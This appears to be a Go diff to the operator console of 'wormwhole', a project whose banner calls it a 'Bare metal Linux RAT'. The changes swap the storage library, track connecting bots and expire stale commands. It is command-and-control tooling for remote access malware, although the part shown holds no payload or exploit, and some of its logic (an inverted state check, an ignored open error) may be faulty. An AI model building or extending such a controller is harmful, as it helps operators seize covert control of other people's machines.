@@ -4,20 +4,26 @@ import (
 	"bufio"
 	"fmt"
 	"github.com/fatih/color"
-	"github.com/steveyen/gkvlite"
+	"github.com/prologic/bitcask"
 	"github.com/xorium/wormwhole/core"
 	"github.com/xorium/wormwhole/server"
 	"log"
 	"os"
 	"os/signal"
 	"regexp"
+	"strconv"
 	"strings"
 	"sync"
+	"time"
 )
 
 const (
 	stateReady            = iota
 	stateExecutingCommand = iota
+)
+
+const (
+	commandExpireTime = time.Hour
 )
 
 type Console struct {
@@ -27,35 +33,20 @@ type Console struct {
 	reader           *bufio.Reader
 	currentBot       *server.Bot
 	currentState     int
-	bots             *gkvlite.Collection
+	state            *bitcask.Bitcask
 	commandsHandlers map[*regexp.Regexp]func([]string) error
 	currentBotsList  []*server.Bot
 }
 
 func NewConsole(srv *server.CommandServer) *Console {
-	f, err := os.OpenFile("wormwhole.gkvlite", os.O_CREATE|os.O_RDWR, os.ModePerm)
-	if err != nil {
-		log.Fatal(err)
-	}
-	s, err := gkvlite.NewStore(f)
-	if err != nil {
-		log.Fatal(err)
-	}
-	bots := s.GetCollection("bots")
-
-	c := &Console{
+	db, _ := bitcask.Open("wormwhole.db")
+	return &Console{
 		RWMutex:      new(sync.RWMutex),
 		srv:          srv,
 		reader:       bufio.NewReader(os.Stdin),
-		bots:         bots,
+		state:        db,
 		currentState: stateReady,
 	}
-
-	c.initCommands()
-	c.initServerHandlers()
-	c.startInterruptHandling()
-
-	return c
 }
 
 func (c *Console) startInterruptHandling() {
@@ -80,24 +71,30 @@ func (c *Console) startInterruptHandling() {
 }
 
 func (c *Console) initServerHandlers() {
-	c.srv.OnConnect(func(bot *server.Bot) {
+	c.srv.SetOnConnect(func(bot *server.Bot) {
+		c.Lock()
+		c.currentBotsList = c.srv.ListBots()
+		c.Unlock()
 		printer := color.New(color.FgHiGreen, color.Bold)
-		_, _ = printer.Printf("[+] bot connected: %s\n", bot.String())
+		_, _ = printer.Printf("\n[+] bot connected: %s\n", bot.String())
+		c.printCommandInvitation()
 	})
 
-	c.srv.OnDisconnect(func(bot *server.Bot) {
+	c.srv.SetOnDisconnect(func(bot *server.Bot) {
 		printer := color.New(color.FgHiRed, color.Bold)
-		_, _ = printer.Printf("[-] bot disconnected: %s\n", bot.String())
+		_, _ = printer.Printf("\n[-] bot disconnected: %s\n", bot.String())
 		if c.currentBot != nil && c.currentBot.ID == bot.ID {
 			c.Lock()
+			c.currentBotsList = c.srv.ListBots()
 			c.currentBot = nil
 			c.currentState = stateReady
 			c.Unlock()
 		}
+		c.printCommandInvitation()
 	})
 
-	c.srv.OnCommandRespHandler(func(cmd *core.Command, resp []byte) {
-		if cmd.State() != core.CommandStateInterrupted {
+	c.srv.SetOnCommandRespHandler(func(cmd *core.Command, resp []byte) {
+		if cmd.State() == core.CommandStateInterrupted {
 			if c.Debug {
 				log.Println("interrupted command: ", cmd)
 			}
@@ -108,6 +105,7 @@ func (c *Console) initServerHandlers() {
 		c.Unlock()
 		if cmd.State() == core.CommandStateFailed {
 			color.HiRed("command error: %s\n", string(resp))
+			c.printCommandInvitation()
 			return
 		}
 		color.White(string(resp))
@@ -125,9 +123,11 @@ func (c *Console) getBotString(bot *server.Bot) string {
 }
 
 func (c *Console) getAlias(botId string) string {
-	alias, err := c.bots.Get([]byte("alias:" + botId))
+	alias, err := c.state.Get([]byte("alias:" + botId))
 	if err != nil {
-		log.Println("error while getting bot alias: ", err)
+		if c.Debug {
+			log.Println("error while getting bot alias: ", err)
+		}
 		return ""
 	}
 	if alias == nil {
@@ -139,11 +139,35 @@ func (c *Console) getAlias(botId string) string {
 
 func (c *Console) saveAlias(botId, alias string) {
 	c.Lock()
-	err := c.bots.Set([]byte("alias:"+botId), []byte(alias))
+	err := c.state.Put([]byte("alias:"+botId), []byte(alias))
 	c.Unlock()
 	if err != nil {
 		log.Println("error while saving bot alias: ", err)
 	}
+}
+
+func (c *Console) startCheckingExpiringCommands() {
+	go func() {
+		ticker := time.NewTicker(5 * time.Second)
+		defer func() { _ = ticker.Stop }()
+		for range ticker.C {
+			for _, cmd := range c.srv.ListCommands() {
+				if cmd.State() != core.CommandStateExecuting {
+					c.srv.DeleteCommand(cmd.ID)
+					continue
+				}
+				cmdTime, err := strconv.ParseInt(cmd.ID, 10, 64)
+				if err != nil {
+					log.Println("can't parse command ID to time: ", err)
+					continue
+				}
+				if time.Duration(time.Now().UnixNano()-cmdTime) > commandExpireTime {
+					c.srv.DeleteCommand(cmd.ID)
+					color.Red("command %s %s has been expired", cmd.ID, cmd.Name)
+				}
+			}
+		}
+	}()
 }
 
 func (c *Console) getInput() (string, error) {
@@ -181,13 +205,18 @@ func (c *Console) printBanner() {
 ██║███╗██║██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║██║   ██║██║     ██╔══╝  
 ╚███╔███╔╝╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗███████╗
  ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
-                       Bare metal Linux RAT
+                        Bare metal Linux RAT
 `
 	color.Green(banner)
 }
 
 func (c *Console) Run() {
+	c.initCommands()
+	c.initServerHandlers()
+	c.startInterruptHandling()
+	c.startCheckingExpiringCommands()
 	c.printBanner()
+
 	for {
 		c.printCommandInvitation()
 		text, err := c.getInput()
@@ -195,8 +224,7 @@ func (c *Console) Run() {
 			log.Println("error while getting command input: ", err)
 			continue
 		}
-		text = strings.TrimRight(text, "\n")
-		if text == "" {
+		if text = strings.TrimRight(text, "\n"); text == "" {
 			continue
 		}
 		if err := c.handleCommandInput(text); err != nil {
